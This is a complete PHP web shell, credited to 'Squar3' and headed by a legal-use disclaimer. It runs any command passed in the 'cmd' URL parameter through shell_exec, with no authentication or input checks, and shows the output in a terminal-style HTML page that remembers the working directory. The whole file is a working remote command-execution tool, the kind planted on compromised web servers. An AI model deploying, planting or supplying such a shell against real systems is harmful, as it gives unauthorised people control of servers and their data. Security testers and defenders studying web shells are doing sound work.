<?php

#   Single-file php shell made by Squar3
#    TOS
#    This tool can only be used for legal purposes. You take full responsibility for any actions performed using this.
#    The owner of the tool is not responsible for the damage caused by it.
#    DON'T USE IT WITHOUT PERMESSIONS

### START OF PHP

// ini_set('display_errors', 1);ini_set('display_startup_errors', 1);error_reporting(E_ALL);

session_start();
#Setting the location variable
if ($_SESSION['location'] === null) {
    $location = exec("pwd");
    $_SESSION['location'] = $location;
} else {
    $location = $_SESSION['location'];
}


if (!isset($_GET['cmd']) || $_GET['cmd'] == null) {
    $cmd = "whoami"; #Default command
} else {
    $cmd = $_GET['cmd'];
    #We will add ; after the $_GET['cmd'] so we need to remove the `;` from the end in case the user put it there
    if ($cmd[strlen($cmd) - 1] == ";") {
        $cmd = substr($cmd, 0, -1);
    }
}

#THE COMMAND THAT WILL EXECUTE
$ot_cmd = shell_exec("cd " . $location . ";" . $cmd . ";echo '\n###Current path';pwd;"); # IN CASE YOU ARE EDDITING THIS DON'T REMOVE THE (pwd) command since we use it later


try {
    #Getting the return of pwd from $ot_cmd
    $output_list =  explode("\n", $ot_cmd);
    $_SESSION['location'] = $output_list[sizeof($output_list) - 2];
    $location = $_SESSION['location'];
} catch (exception $e) {}

### END OF PHP
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Shell</title>
</head>

<body>
    <center>
        <!-- Reset button -->
        <button class="button button1" onclick="deleteAllCookies()">Reset</button><br><br>

        <!-- Terminal output -->
        <div class="terminal">
            <br>

            <p class="bash">
                <location>[<?= shell_exec('whoami'); ?><?= $location ?>]$</location> <?= $cmd ?>
            </p>
            <pre style="color:white;position:relative;left:20px;"><?= $ot_cmd ?></pre>

        </div>

        <!-- Terminal input -->
        <form method="GET">
            <input name="cmd" class="terminal-input" autofocus placeholder="Enter command here."><br><br>
            <br><br><button class="button button1" type="submit">Send</button>
        </form>

        <br>
    </center>

    <!-- CSS -->
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Mono&display=swap');

        body {
            background-color: #323232;
        }

        .terminal {
            width: 95%;
            height: 650px;
            background-color: white;
            /* border-radius: 3%; */
            text-align: left;
            background-color: black;
        }

        .terminal-input {
            width: 93%;
            height: 30px;
            /* border-radius: 10%; */
            padding-left: 1%;
            padding-right: 1%;
            background-color: black;
            color: white;
            border: none;
            font-size: 15px;
            font-family: 'Noto Sans Mono', monospace;
        }

        .terminal-input:focus {
            outline: none;
        }

        .bash {
            font-family: 'Noto Sans Mono', monospace;
            /* float: left; */
            position: relative;
            left: 20px;
            font-size: 14px;
            color: white;
        }

        location {
            color: #8ca882;
        }

        .button {
            background-color: #4CAF50;
            /* Green */
            border: none;
            color: white;
            padding: 8px 16px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 4px 2px;
            transition-duration: 0.4s;
            cursor: pointer;
        }

        .button1 {
            background-color: transparent;
            color: white;
            border: 2px solid #4CAF50;
        }

        .button1:hover {
            background-color: #4CAF50;
            color: white;
        }
    </style>
    <!-- JS -->
    <script>
        function deleteAllCookies() {
            var cookies = document.cookie.split(";");

            for (var i = 0; i < cookies.length; i++) {
                var cookie = cookies[i];
                var eqPos = cookie.indexOf("=");
                var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
                document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
                document.location = location.protocol + '//' + location.host + location.pathname
                // location.reload();
            }
        }
    </script>
</body>

</html>